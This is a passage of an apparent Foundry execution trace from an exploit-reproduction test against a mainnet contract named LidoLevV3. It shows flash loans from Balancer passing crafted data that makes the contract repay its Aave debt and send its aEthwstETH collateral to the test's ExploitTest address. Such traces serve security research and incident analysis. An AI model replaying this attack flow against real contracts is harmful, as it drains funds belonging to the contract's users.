+    │   │   ├─ [534] WstETH::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
+    │   │   │   └─ ← [Return] 307089429045260432253 [3.07e20]
+    │   │   ├─ [41266] WstETH::unwrap(307089429045260432253 [3.07e20])
+    │   │   │   ├─ [6163] AppProxyUpgradeable::fallback(307089429045260432253 [3.07e20]) [staticcall]
+    │   │   │   │   ├─ [1763] KernelProxy::fallback(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
+    │   │   │   │   │   ├─ [820] Kernel::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] Lido: [0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb]
+    │   │   │   │   │   └─ ← [Return] Lido: [0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb]
+    │   │   │   │   ├─ [2783] Lido::getPooledEthByShares(307089429045260432253 [3.07e20]) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 354857315711054167339 [3.548e20]
+    │   │   │   │   └─ ← [Return] 354857315711054167339 [3.548e20]
+    │   │   │   ├─ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: 0x0000000000000000000000000000000000000000, value: 307089429045260432253 [3.07e20])
+    │   │   │   ├─ [24083] AppProxyUpgradeable::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 354857315711054167339 [3.548e20])
+    │   │   │   │   ├─ [1763] KernelProxy::fallback(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
+    │   │   │   │   │   ├─ [820] Kernel::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] Lido: [0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb]
+    │   │   │   │   │   └─ ← [Return] Lido: [0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb]
+    │   │   │   │   ├─ [20697] Lido::transfer(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 354857315711054167339 [3.548e20]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0], to: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], value: 354857315711054167339 [3.548e20])
+    │   │   │   │   │   ├─ emit TransferShares(from: WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0], to: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], sharesValue: 307089429045260432252 [3.07e20])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xa69c31ad883ca5d0f069e8f3539b578234aa915726262552bd610e701e134b71: 1 → 0x000000000000000000000000000000000000000000000010a5b8d0afe845b37d
+    │   │   │   │   │   │   @ 0xf37caed32e4e49c83636e0f1684f3f4a9a23c463a49eb17cd63abd50680b378b: 0x00000000000000000000000000000000000000000002cc58a2280e4bbf781190 → 0x00000000000000000000000000000000000000000002cc47fc6f3d9bd7325e14
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xa69c31ad883ca5d0f069e8f3539b578234aa915726262552bd610e701e134b71: 0x000000000000000000000000000000000000000000000010a5b8d0afe845b37d → 0
+    │   │   │   │   @ 2: 0x00000000000000000000000000000000000000000002cc58a224dbd12a68d9da → 0x00000000000000000000000000000000000000000002cc47fc6c0b214223265d
+    │   │   │   └─ ← [Return] 354857315711054167339 [3.548e20]
+    │   │   ├─ [6468] AppProxyUpgradeable::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
+    │   │   │   ├─ [1763] KernelProxy::fallback(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
+    │   │   │   │   ├─ [820] Kernel::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] Lido: [0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb]
+    │   │   │   │   └─ ← [Return] Lido: [0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb]
+    │   │   │   ├─ [3088] Lido::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 354857315711054167339 [3.548e20]
+    │   │   │   └─ ← [Return] 354857315711054167339 [3.548e20]
+    │   │   ├─ [6468] AppProxyUpgradeable::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
+    │   │   │   ├─ [1763] KernelProxy::fallback(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
+    │   │   │   │   ├─ [820] Kernel::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] Lido: [0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb]
+    │   │   │   │   └─ ← [Return] Lido: [0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb]
+    │   │   │   ├─ [3088] Lido::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
+    │   │   │   │   └─ ← [Return] 354857315711054167339 [3.548e20]
+    │   │   │   └─ ← [Return] 354857315711054167339 [3.548e20]
+    │   │   ├─ [90531] 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022::exchange(1, 0, 354857315711054167339 [3.548e20], 354502458395343113172 [3.545e20])
+    │   │   │   ├─ [8468] AppProxyUpgradeable::fallback(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022) [staticcall]
+    │   │   │   │   ├─ [1763] KernelProxy::fallback(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
+    │   │   │   │   │   ├─ [820] Kernel::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] Lido: [0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb]
+    │   │   │   │   │   └─ ← [Return] Lido: [0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb]
+    │   │   │   │   ├─ [5088] Lido::balanceOf(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022) [delegatecall]
+    │   │   │   │   │   └─ ← [Return] 45713660374355418056101 [4.571e22]
+    │   │   │   │   └─ ← [Return] 45713660374355418056101 [4.571e22]
+    │   │   │   ├─ [16796] AppProxyUpgradeable::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, 354857315711054167339 [3.548e20])
+    │   │   │   │   ├─ [1763] KernelProxy::fallback(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320)
+    │   │   │   │   │   ├─ [820] Kernel::getApp(0xf1f3eb40f5bc1ad1344716ced8b8a0431d840b5783aea1fd01786bc26f35ac0f, 0x3ca7c3e38968823ccb4c78ea688df41356f182ae1d159e4ee608d30d68cef320) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] Lido: [0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb]
+    │   │   │   │   │   └─ ← [Return] Lido: [0x17144556fd3424EDC8Fc8A4C940B2D04936d17eb]
+    │   │   │   │   ├─ [13404] Lido::transferFrom(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, 354857315711054167339 [3.548e20]) [delegatecall]
+    │   │   │   │   │   ├─ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, value: 354857315711054167339 [3.548e20])
+    │   │   │   │   │   ├─ emit TransferShares(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022, sharesValue: 307089429045260432252 [3.07e20])
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0xae68078d7ee25b2b7bcb7d4b9fe9acf61f251fe08ff637df07889375d8385158: 0x0000000000000000000000000000000000000000000008608e51fc6c2e715c9d → 0x000000000000000000000000000000000000000000000871340acd1c16b71019
+    │   │   │   │   │   │   @ 0xa69c31ad883ca5d0f069e8f3539b578234aa915726262552bd610e701e134b71: 0x000000000000000000000000000000000000000000000010a5b8d0afe845b37d → 1
+    │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   └─ ← [Return] true
+    │   │   │   ├─ [18] PRECOMPILES::identity(0x0000000000000000000000000000000000000000000000000000000000000000)
+    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
+    │   │   │   ├─ [55] LidoLevV3::fallback{value: 354675630591246269703}()
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ emit TokenExchange(param0: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], param1: 1, param2: 354857315711054167339 [3.548e20], param3: 0, param4: 354675630591246269703 [3.546e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6: 0x00000000000000000000000000000000000000000000000000076555c262af9e → 0x000000000000000000000000000000000000000000000000004667ba77202182
+    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000133a1cf6dee6e6fd07
+    │   │   ├─ [21974] WETH9::deposit{value: 354675630591246269703}()
+    │   │   │   ├─ emit Deposit(dst: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], wad: 354675630591246269703 [3.546e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x72abcc8c1956d2c5aceb3e4a4a26c855bc628660ed76bd1c9129d9ab812d24ea: 0 → 0x0000000000000000000000000000000000000000000000133a1cf6dee6e6fd07
+    │   │   │   └─ ← [Stop]
+    │   │   ├─ [3262] WETH9::transfer(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], 318973831042619036856 [3.189e20])
+    │   │   │   ├─ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], value: 318973831042619036856 [3.189e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x3a0f132b80eb284c2ac247698d2ec7dce851ca420b700161ad6082d0e9762150: 0x000000000000000000000000000000000000000000000bc5b45b26818033598a → 0x000000000000000000000000000000000000000000000bd6ff01d7d7e4f9ae42
+    │   │   │   │   @ 0x72abcc8c1956d2c5aceb3e4a4a26c855bc628660ed76bd1c9129d9ab812d24ea: 0x0000000000000000000000000000000000000000000000133a1cf6dee6e6fd07 → 0x000000000000000000000000000000000000000000000001ef7645888220a84f
+    │   │   │   └─ ← [Return] true
+    │   │   └─ ← [Stop]
+    │   ├─ [534] WETH9::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
+    │   │   └─ ← [Return] 55912009748616849239618 [5.591e22]
+    │   ├─ emit FlashLoan(recipient: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], token: WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], amount: 318973831042619036856 [3.189e20], feeAmount: 0)
+    │   └─ ← [Stop]
+    ├─ [149932] Balancer::flashLoan(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [0], 0x00000000000000000000000000000000000000000000000000000000000000020000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
+    │   ├─ [534] WETH9::balanceOf(Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8]) [staticcall]
+    │   │   └─ ← [Return] 55912009748616849239618 [5.591e22]
+    │   ├─ [350] ProtocolFeesCollector::getFlashLoanFeePercentage() [staticcall]
+    │   │   └─ ← [Return] 0
+    │   ├─ [3262] WETH9::transfer(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 0)
+    │   │   ├─ emit Transfer(from: Balancer: [0xBA12222222228d8Ba445958a75a0704d566BF2C8], to: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], value: 0)
+    │   │   └─ ← [Return] true
+    │   ├─ [131707] LidoLevV3::receiveFlashLoan([0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], [0], [0], 0x00000000000000000000000000000000000000000000000000000000000000020000000000000000000000007fa9385be102ac3eac297483dd6233d62b3e1496)
+    │   │   ├─ [3038] InitializableImmutableAdminUpgradeabilityProxy::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
+    │   │   │   ├─ [2486] VariableDebtToken::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
+    │   │   │   │   ├─ [1325] InitializableImmutableAdminUpgradeabilityProxy::fallback(WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [staticcall]
+    │   │   │   │   │   ├─ [805] Pool::getReserveNormalizedVariableDebt(WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 1035024658069051456948664591 [1.035e27]
+    │   │   │   │   │   └─ ← [Return] 1035024658069051456948664591 [1.035e27]
+    │   │   │   │   └─ ← [Return] 35002954502486078893 [3.5e19]
+    │   │   │   └─ ← [Return] 35002954502486078893 [3.5e19]
+    │   │   ├─ [47974] InitializableImmutableAdminUpgradeabilityProxy::fallback(WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 35002954502486078893 [3.5e19], 2, LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142])
+    │   │   │   ├─ [47439] Pool::repay(WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], 35002954502486078893 [3.5e19], 2, LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
+    │   │   │   │   ├─ [45793] BorrowLogic::40e95de6(0000000000000000000000000000000000000000000000000000000000000034000000000000000000000000000000000000000000000000000000000000003682b974bece31f54dd185455479045bf3d5fe6f936188dd73e07668d61e052f29000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2000000000000000000000000000000000000000000000001e5c379aa99d7b5ad0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000cd6ca2f0d0c182c5049d9a1f65cde51a706ae1420000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
+    │   │   │   │   │   ├─ [968] InitializableImmutableAdminUpgradeabilityProxy::fallback() [staticcall]
+    │   │   │   │   │   │   ├─ [419] VariableDebtToken::scaledTotalSupply() [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 452915389085583398685451 [4.529e23]
+    │   │   │   │   │   │   └─ ← [Return] 452915389085583398685451 [4.529e23]
+    │   │   │   │   │   ├─ [1482] InitializableImmutableAdminUpgradeabilityProxy::fallback() [staticcall]
+    │   │   │   │   │   │   ├─ [921] StableDebtToken::getSupplyData() [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 0
+    │   │   │   │   │   │   └─ ← [Return] 0, 0, 0, 0
+    │   │   │   │   │   ├─ [1201] InitializableImmutableAdminUpgradeabilityProxy::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
+    │   │   │   │   │   │   ├─ [649] StableDebtToken::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   │   └─ ← [Return] 0
+    │   │   │   │   │   ├─ [3038] InitializableImmutableAdminUpgradeabilityProxy::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
+    │   │   │   │   │   │   ├─ [2486] VariableDebtToken::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [1325] InitializableImmutableAdminUpgradeabilityProxy::fallback(WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [staticcall]
+    │   │   │   │   │   │   │   │   ├─ [805] Pool::getReserveNormalizedVariableDebt(WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Return] 1035024658069051456948664591 [1.035e27]
+    │   │   │   │   │   │   │   │   └─ ← [Return] 1035024658069051456948664591 [1.035e27]
+    │   │   │   │   │   │   │   └─ ← [Return] 35002954502486078893 [3.5e19]
+    │   │   │   │   │   │   └─ ← [Return] 35002954502486078893 [3.5e19]
+    │   │   │   │   │   ├─ [9487] InitializableImmutableAdminUpgradeabilityProxy::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 35002954502486078893 [3.5e19], 1035024658069051456948664591 [1.035e27])
+    │   │   │   │   │   │   ├─ [8926] VariableDebtToken::burn(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 35002954502486078893 [3.5e19], 1035024658069051456948664591 [1.035e27]) [delegatecall]
+    │   │   │   │   │   │   │   ├─ [1201] InitializableImmutableAdminUpgradeabilityProxy::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 452915389085583398685451 [4.529e23], 33818474013737809897 [3.381e19])
+    │   │   │   │   │   │   │   │   ├─ [675] RewardsController::handleAction(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 452915389085583398685451 [4.529e23], 33818474013737809897 [3.381e19]) [delegatecall]
+    │   │   │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   │   │   ├─ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: 0x0000000000000000000000000000000000000000, value: 35002954502486078893 [3.5e19])
+    │   │   │   │   │   │   │   ├─ emit Burn(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], target: 0x0000000000000000000000000000000000000000, value: 35002954502486078893 [3.5e19], balanceIncrease: 0, index: 1035024658069051456948664591 [1.035e27])
+    │   │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   │   @ 0xc5a4446417df74ed5e0566b54b80821d4e335b6f7312c39070cee6a5bd20d520: 0x00000000035826ff2489bafa33adf90f0000000000000001d5535af0029ef7e9 → 0x00000000035826ff2489bafa33adf90f00000000000000000000000000000000
+    │   │   │   │   │   │   │   │   @ 58: 0x000000000000000000000000000000000000000000005fe897aa24c32ea04b0b → 0x000000000000000000000000000000000000000000005fe6c256c9d32c015322
+    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000005fe6c256c9d32c015322
+    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000005fe6c256c9d32c015322
+    │   │   │   │   │   ├─ [5160] DefaultReserveInterestRateStrategy::calculateInterestRates(CalculateInterestRatesParams({ unbacked: 0, liquidityAdded: 35002954502486078893 [3.5e19], liquidityTaken: 0, totalStableDebt: 0, totalVariableDebt: 468743592768014871366825 [4.687e23], averageStableBorrowRate: 0, reserveFactor: 1500, reserve: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, aToken: 0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8 })) [staticcall]
+    │   │   │   │   │   │   ├─ [534] WETH9::balanceOf(InitializableImmutableAdminUpgradeabilityProxy: [0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8]) [staticcall]
+    │   │   │   │   │   │   │   └─ ← [Return] 143328227390135769224983 [1.433e23]
+    │   │   │   │   │   │   └─ ← [Return] 15507817994296699304422341 [1.55e25], 92034988307315731011355622 [9.203e25], 23824491815121011707948936 [2.382e25]
+    │   │   │   │   │   ├─ emit ReserveDataUpdated(reserve: WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], liquidityRate: 15507817994296699304422341 [1.55e25], stableBorrowRate: 92034988307315731011355622 [9.203e25], variableBorrowRate: 23824491815121011707948936 [2.382e25], liquidityIndex: 1019369531491344843689208548 [1.019e27], variableBorrowIndex: 1035024658069051456948664591 [1.035e27])
+    │   │   │   │   │   ├─ [3425] WETH9::transferFrom(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], InitializableImmutableAdminUpgradeabilityProxy: [0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8], 35002954502486078893 [3.5e19])
+    │   │   │   │   │   │   ├─ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: InitializableImmutableAdminUpgradeabilityProxy: [0x4d5F47FA6A74757f35C14fD3a6Ef8E3C9BC514E8], value: 35002954502486078893 [3.5e19])
+    │   │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   │   @ 0x72abcc8c1956d2c5aceb3e4a4a26c855bc628660ed76bd1c9129d9ab812d24ea: 0x000000000000000000000000000000000000000000000001ef7645888220a84f → 0x00000000000000000000000000000000000000000000000009b2cbdde848f2a2
+    │   │   │   │   │   │   │   @ 0xb064600732a82908427d092d333e607598a6238a59aeb45e1288cb0bac7161cf: 0x000000000000000000000000000000000000000000001e59d6ba01d57f73d717 → 0x000000000000000000000000000000000000000000001e5bbc7d7b80194b8cc4
+    │   │   │   │   │   │   └─ ← [Return] true
+    │   │   │   │   │   ├─ [1136] InitializableImmutableAdminUpgradeabilityProxy::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 35002954502486078893 [3.5e19])
+    │   │   │   │   │   │   ├─ [578] AToken::handleRepayment(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 35002954502486078893 [3.5e19]) [delegatecall]
+    │   │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   │   ├─ emit Repay(reserve: WETH9: [0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2], user: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], repayer: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], amount: 35002954502486078893 [3.5e19], useATokens: false)
+    │   │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   │   @ 0x82b974bece31f54dd185455479045bf3d5fe6f936188dd73e07668d61e052f29: 9 → 8
+    │   │   │   │   │   │   @ 0xf81d8d79f42adb4c73cc3aa0c78e25d3343882d0313c0b80ece3d3a103ef1ec1: 0x000000000013b568bb97eaae1823947200000000035826ff2489bafa33adf90f → 0x000000000013b5084a0a0d0de69b2f8800000000035826ff2489bafa33adf90f
+    │   │   │   │   │   │   @ 0xf81d8d79f42adb4c73cc3aa0c78e25d3343882d0313c0b80ece3d3a103ef1ec2: 0x00000000000000000000000065bb6f7700000000004c21b47d6a4f6177e9af7e → 0x00000000000000000000000065bb6f7700000000004c212ab69fa50ee80243e6
+    │   │   │   │   │   │   @ 0xf81d8d79f42adb4c73cc3aa0c78e25d3343882d0313c0b80ece3d3a103ef1ec0: 0x00000000000cd4660e7e92740cb1f08c00000000034b33e507c9c2422a5caae4 → 0x00000000000cd3e87f7cafba07662bc500000000034b33e507c9c2422a5caae4
+    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000001e5c379aa99d7b5ad
+    │   │   │   │   └─ ← [Return] 35002954502486078893 [3.5e19]
+    │   │   │   └─ ← [Return] 35002954502486078893 [3.5e19]
+    │   │   ├─ [3082] aEthwstETH::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [staticcall]
+    │   │   │   ├─ [2530] AToken::balanceOf(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142]) [delegatecall]
+    │   │   │   │   ├─ [1356] InitializableImmutableAdminUpgradeabilityProxy::fallback(WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0]) [staticcall]
+    │   │   │   │   │   ├─ [804] Pool::getReserveNormalizedIncome(WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 1000527341973624759506438367 [1e27]
+    │   │   │   │   │   └─ ← [Return] 1000527341973624759506438367 [1e27]
+    │   │   │   │   └─ ← [Return] 33698806193381635860 [3.369e19]
+    │   │   │   └─ ← [Return] 33698806193381635860 [3.369e19]
+    │   │   ├─ [68076] aEthwstETH::fallback(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 33698806193381635860 [3.369e19])
+    │   │   │   ├─ [67521] AToken::transfer(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 33698806193381635860 [3.369e19]) [delegatecall]
+    │   │   │   │   ├─ [1356] InitializableImmutableAdminUpgradeabilityProxy::fallback(WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0]) [staticcall]
+    │   │   │   │   │   ├─ [804] Pool::getReserveNormalizedIncome(WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Return] 1000527341973624759506438367 [1e27]
+    │   │   │   │   │   └─ ← [Return] 1000527341973624759506438367 [1e27]
+    │   │   │   │   ├─ [1201] InitializableImmutableAdminUpgradeabilityProxy::fallback(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 840277344194556828894021 [8.402e23], 33681044764761642582 [3.368e19])
+    │   │   │   │   │   ├─ [675] RewardsController::handleAction(LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], 840277344194556828894021 [8.402e23], 33681044764761642582 [3.368e19]) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─ [1201] InitializableImmutableAdminUpgradeabilityProxy::fallback(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 840277344194556828894021 [8.402e23], 0)
+    │   │   │   │   │   ├─ [675] RewardsController::handleAction(ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 840277344194556828894021 [8.402e23], 0) [delegatecall]
+    │   │   │   │   │   │   └─ ← [Stop]
+    │   │   │   │   │   └─ ← [Return]
+    │   │   │   │   ├─ emit Transfer(from: LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], to: ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 33698806193381635860 [3.369e19])
+    │   │   │   │   ├─ [33031] InitializableImmutableAdminUpgradeabilityProxy::fallback(WstETH: [0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0], LidoLevV3: [0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142], ExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 33698806193381635860 [3.369e19], 33698806193381635860 [3.369e19], 0)
